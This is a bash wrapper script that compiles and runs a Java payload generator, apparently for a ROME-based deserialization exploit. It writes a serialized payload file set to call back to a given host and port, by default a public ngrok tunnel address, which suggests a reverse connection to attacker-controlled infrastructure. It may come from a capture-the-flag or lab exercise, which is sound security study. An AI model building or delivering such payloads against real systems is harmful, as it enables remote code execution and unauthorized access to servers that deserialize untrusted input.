#!/usr/bin/env bash
set -euo pipefail

if [[ $# -lt 1 || $# -gt 4 ]]; then
  echo "Usage: $0 <port> [host] [output.ser] [transactionId]" >&2
  echo "Example: $0 12467" >&2
  exit 1
fi

PORT="$1"
HOST="${2:-0.tcp.ap.ngrok.io}"
OUTPUT="${3:-Payload/payload.ser}"
TRANSACTION_ID="${4:-1}"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd -- "$SCRIPT_DIR/.." && pwd)"

cd "$PROJECT_ROOT"

mvn -q -DskipTests compile dependency:build-classpath -Dmdep.outputFile=target/payload-classpath.txt

PROJECT_CP="target/classes:$(cat target/payload-classpath.txt)"
GENERATOR_CLASSES="Payload/build/classes"

mkdir -p "$GENERATOR_CLASSES" "$(dirname "$OUTPUT")"

javac -cp "$PROJECT_CP" -d "$GENERATOR_CLASSES" Payload/ModernRomePayloadGenerator.java

java --add-opens java.base/java.util=ALL-UNNAMED \
  -cp "$GENERATOR_CLASSES:$PROJECT_CP" \
  ModernRomePayloadGenerator "$HOST" "$PORT" "$OUTPUT" "$TRANSACTION_ID"
